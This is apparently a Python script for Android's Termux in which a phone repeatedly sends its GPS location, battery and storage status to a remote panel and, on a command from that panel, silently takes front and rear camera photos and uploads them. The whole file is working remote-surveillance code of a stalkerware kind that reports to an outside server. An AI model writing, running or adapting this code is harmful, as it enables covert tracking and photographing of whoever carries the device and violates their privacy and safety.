import time
import subprocess
import json
import requests
import os
import uuid
import base64

URL_SERVIDOR = "https://nexos-panel.onrender.com/update"
URL_UPLOAD_CAM = "https://nexos-panel.onrender.com/api/upload_camera"
ARQUIVO_ID = os.path.expanduser("~/.nexos_device_id")
ARQUIVO_FOTO = os.path.expanduser("~/nexos_captura.jpg")

def run_command(cmd):
    try: return subprocess.check_output(cmd, shell=True).decode().strip()
    except: return ""

def obter_ou_criar_id_unico():
    if os.path.exists(ARQUIVO_ID):
        with open(ARQUIVO_ID, "r") as f: return f.read().strip()
    novo_id = f"NX-{str(uuid.uuid4())[:6].upper()}"
    with open(ARQUIVO_ID, "w") as f: f.write(novo_id)
    return novo_id

DEVICE_ID = obter_ou_criar_id_unico()

print("\n" + "="*45)
print(f"🛰️  MOTOR NEXOS DUAL STREAM CARD OPERACIONAL")
print(f"🔑  SEU MONITOR ID DE PROD: {DEVICE_ID}")
print("="*45 + "\n")

ultima_lat_valida = -16.6869
ultima_lon_valida = -49.2648
headers_json = {"Content-Type": "application/json"}

while True:
    battery = "N/A"
    out_bat = run_command("termux-battery-status")
    if out_bat:
        try: battery = str(json.loads(out_bat).get("percentage", "N/A"))
        except: pass
        
    storage = "N/A"
    out_df = run_command("df -h /data/data/com.termux/files/home")
    if out_df:
        try:
            lines = out_df.split("\n")
            if len(lines) > 1:
                parts = [p for p in lines[1].split(" ") if p]
                if len(parts) >= 3: storage = f"{parts[3]} livres"
        except: pass

    lat, lon = ultima_lat_valida, ultima_lon_valida
    out_loc = run_command("termux-location -p gps -r once")
    if out_loc:
        try:
            loc_data = json.loads(out_loc)
            if loc_data.get("latitude") and loc_data.get("longitude"):
                lat = loc_data.get("latitude")
                lon = loc_data.get("longitude")
                ultima_lat_valida = lat
                ultima_lon_valida = lon
        except: pass

    payload = {
        "device_id": DEVICE_ID,
        "battery": battery,
        "storage": storage,
        "uptime": "Ativo",
        "lat": lat,
        "lon": lon
    }

    try:
        response = requests.post(URL_SERVIDOR, data=json.dumps(payload), headers=headers_json, timeout=5)
        if response.status_code == 200:
            res_data = response.json()
            comando_cam = str(res_data.get("comando_cam", "wait")).lower() # Força ficar minúsculo
            
            print(f"🛰️ [OK] GPS Sincronizado. Ordem pendente: {comando_cam.upper()}")
            
            if comando_cam == "take_dual":
                print("📸 [AÇÃO] DISPARANDO CAPTURA REMOTA EM DUAS LENTES AO MESMO TEMPO...")
                
                # --- LENTE 1: FRONTAL ---
                if os.path.exists(ARQUIVO_FOTO): os.remove(ARQUIVO_FOTO)
                run_command(f"termux-camera-photo -c 1 --size 640x480 {ARQUIVO_FOTO}")
                time.sleep(1.5)
                if os.path.exists(ARQUIVO_FOTO) and os.path.getsize(ARQUIVO_FOTO) > 0:
                    with open(ARQUIVO_FOTO, "rb") as img_file:
                        f_b64 = base64.b64encode(img_file.read()).decode('utf-8')
                    requests.post(URL_UPLOAD_CAM, data=json.dumps({"device_id": DEVICE_ID, "tipo": "front", "photo": f_b64}), headers=headers_json, timeout=10)
                    print("🚀 -> Lente Frontal enviada!")

                # --- LENTE 2: TRASEIRA ---
                if os.path.exists(ARQUIVO_FOTO): os.remove(ARQUIVO_FOTO)
                run_command(f"termux-camera-photo -c 0 --size 640x480 {ARQUIVO_FOTO}")
                time.sleep(1.5)
                if os.path.exists(ARQUIVO_FOTO) and os.path.getsize(ARQUIVO_FOTO) > 0:
                    with open(ARQUIVO_FOTO, "rb") as img_file:
                        b_b64 = base64.b64encode(img_file.read()).decode('utf-8')
                    requests.post(URL_UPLOAD_CAM, data=json.dumps({"device_id": DEVICE_ID, "tipo": "back", "photo": b_b64}), headers=headers_json, timeout=10)
                    print("🚀 -> Lente Traseira enviada!")
                    
                if os.path.exists(ARQUIVO_FOTO): os.remove(ARQUIVO_FOTO)
                print("🎯 [FIM] Sincronismo concluido com sucesso!")
                    
    except Exception as e:
        print(f"⚠️ Alerta: {e}")

    time.sleep(2.0)
